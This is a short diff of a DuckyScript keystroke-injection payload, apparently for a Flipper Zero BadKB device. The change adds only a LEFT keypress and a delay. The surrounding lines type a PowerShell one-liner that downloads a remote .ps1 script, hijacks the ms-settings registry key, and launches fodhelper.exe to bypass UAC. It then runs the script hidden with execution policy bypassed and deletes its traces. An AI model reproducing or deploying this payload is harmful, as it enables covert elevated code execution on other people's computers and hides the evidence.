@@ -6,6 +6,8 @@ GUI x
 DELAY 2000
 A
 DELAY 1000
+LEFT
+DELAY 500
 ENTER
 DELAY 3000
 STRING powershell -Command "New-Item -ItemType Directory -Path C:\temp -Force; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile 'C:\temp\badkb.ps1'; New-Item -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Value '' -Force; Set-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Value 'powershell -ExecutionPolicy Bypass -File ''C:\temp\badkb.ps1'' -WindowStyle Hidden' -Force; Start-Process 'C:\Windows\System32\fodhelper.exe'; Start-Sleep 20; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name DelegateExecute -Force; Remove-ItemProperty -Path HKCU:\Software\Classes\ms-settings\Shell\Open\command -Name '(default)' -Force; Remove-Item 'C:\temp\badkb.ps1' -Force; Remove-Item 'C:\temp' -Force"
